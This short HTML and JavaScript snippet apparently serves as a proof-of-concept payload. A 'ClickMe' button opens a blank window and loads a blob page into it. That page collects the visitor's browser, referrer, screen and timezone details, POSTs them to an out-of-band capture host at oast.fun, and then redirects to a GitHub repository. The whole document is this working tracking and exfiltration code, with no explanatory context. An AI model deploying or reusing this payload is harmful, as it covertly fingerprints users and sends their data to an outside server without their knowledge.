<button onclick="test()">ClickMe</button>

<script>
function test() {
  const w = open('about:blank');
  const html = `
    <script>
      const data = {
        ua: navigator.userAgent,
        ref: document.referrer,
        screen: screen.width + 'x' + screen.height,
        tz: Intl.DateTimeFormat().resolvedOptions().timeZone
      };

      fetch('https://jqdfjiuzmdhhkipzoaxxf2ocrw07i3cw7.oast.fun/capture', {
        method: 'POST',
        body: JSON.stringify(data),
        headers: {'Content-Type': 'application/json'}
      });

      setTimeout(() => {
        location.href = 'https://github.com/sauceialist/justwanna.git';
      }, 1000);
    <\/script>
  `;

  const blob = new Blob([html], { type: 'text/html' });
  w.location = URL.createObjectURL(blob);
}
</script>
